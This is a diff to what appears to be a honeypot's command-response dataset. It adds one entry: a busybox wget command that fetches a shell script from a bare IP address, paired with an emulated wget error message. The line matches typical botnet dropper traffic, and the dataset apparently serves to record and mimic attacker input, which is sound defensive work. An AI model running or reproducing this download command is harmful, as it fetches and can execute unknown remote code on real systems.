@@ -275,6 +275,11 @@
     "exit_code": 127
   },
   {
+    "command": "sh/bin/busybox wget http://2.26.136.128/twget.sh -O-",
+    "output": "wget: bad option: '-O-'  \nUsage: wget [OPTION]... [URL]...  \nTry `wget --help' for more information.\n",
+    "exit_code": 0
+  },
+  {
     "command": "shel",
     "output": "shel: command not found\n",
     "exit_code": 127
